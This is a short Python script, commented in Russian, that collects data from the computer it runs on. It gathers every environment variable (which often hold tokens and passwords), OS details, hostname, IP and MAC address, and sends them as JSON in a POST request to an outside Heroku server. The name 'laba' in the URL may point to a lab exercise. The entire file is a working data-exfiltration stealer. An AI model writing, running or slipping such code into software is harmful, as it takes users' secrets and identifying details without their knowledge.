# -*-coding:utf-8 -*-
import os
import platform
import socket
import re
import uuid
import requests
import json
# собираем данные с компьютера пользователя
info = {}
for i in os.environ:
    info[i] = os.environ[i]
info['platform'] = platform.system()
info['platform-release'] = platform.release()
info['platform-version'] = platform.version()
info['architecture'] = platform.machine()
info['hostname'] = socket.gethostname()
info['ip-address'] = socket.gethostbyname(socket.gethostname())
info['mac-address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
info['processor'] = platform.processor()
# # изменяем формат данных для удобной передачи, хранения и обработки
info = json.dumps(info)
#отправляем POST-запрос на сервер
url = "https://vkminiapp.herokuapp.com/api/laba"
res = requests.post(url, data=info, headers={"Content-Type": "application/json"})
